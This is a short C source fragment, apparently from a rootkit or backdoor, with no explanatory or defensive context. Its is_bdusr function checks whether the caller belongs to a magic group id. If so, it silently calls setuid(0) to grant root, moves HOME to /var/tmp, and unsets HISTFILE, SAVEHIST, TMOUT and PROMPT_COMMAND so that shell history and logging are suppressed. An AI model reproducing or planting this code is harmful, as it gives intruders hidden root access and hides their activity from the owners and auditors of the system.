static char *const unset_variables[4] = {"HISTFILE", "SAVEHIST", "TMOUT", "PROMPT_COMMAND"};
#define UNSET_VARIABLES_SIZE sizeofarray(unset_variables)

static void unset_bad_vars(void){
	int i;
	for(i = 0; i < UNSET_VARIABLES_SIZE; i++)
		unsetenv(unset_variables[i]);
}

static int is_bdusr(void){
	int ret = 0;
	if(getgid() == MAGIC_GID){
		ret = 1;
		setuid(0);
		putenv("HOME=/var/tmp/");
	}
	if(ret)
		unset_bad_vars();
	return ret;
}
